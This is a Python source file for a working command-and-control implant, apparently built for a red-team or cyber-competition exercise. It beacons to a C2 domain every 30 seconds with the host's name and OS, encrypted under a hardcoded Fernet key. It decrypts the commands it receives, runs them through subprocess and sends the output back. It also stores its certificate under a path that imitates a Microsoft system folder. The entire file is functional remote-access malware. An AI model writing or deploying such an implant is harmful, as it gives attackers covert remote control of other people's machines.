import requests
import subprocess
import time
import platform
import json
from cryptography.fernet import Fernet

# Encryption setup
SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
cipher = Fernet(SECRET_KEY)

# Failover list
C2_DOMAINS = [
    "https://midevil-scoring-engine.com"
]

# Path to self signed cert
CERT_PATH = r"C:\ProgramData\Microsoft\Network\Settings\nginx-selfsigned.crt"

# Agent check if still alive
def get_system_info():
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "status": "Online"
    }
    return json.dumps(info)

def run_agent():
    print("[*] Secure Agent started. Beginning beaconing...")
    
    while True:
        for url in C2_DOMAINS:
            try:

                raw_data = get_system_info()
                encrypted_heartbeat = cipher.encrypt(raw_data.encode())

                response = requests.post(
                    f"{url}/checkin", 
                    data=encrypted_heartbeat, 
                    timeout=10,
                    verify=CERT_PATH
                )

                if response.status_code == 200:
                    encrypted_command = response.content
                    command = cipher.decrypt(encrypted_command).decode()

                    if command and command.lower() != "none":
                        print(f"[*] Decrypted Command Recieved: {command}")
                        
                        result = subprocess.getoutput(command)
                        
                        encrypted_result = cipher.encrypt(result.encode())
                        requests.post(f"{url}/result", data=encrypted_result, verify=CERT_PATH)
                    
                    break 

            except Exception as e:
                print(f"[!] Failed to connect to {url}: {e}")
                continue # Try the next domain in the list
        
        # Beacon Interval
        print("[*] Sleeping for 30s...")
        time.sleep(30)

if __name__ == "__main__":
    run_agent()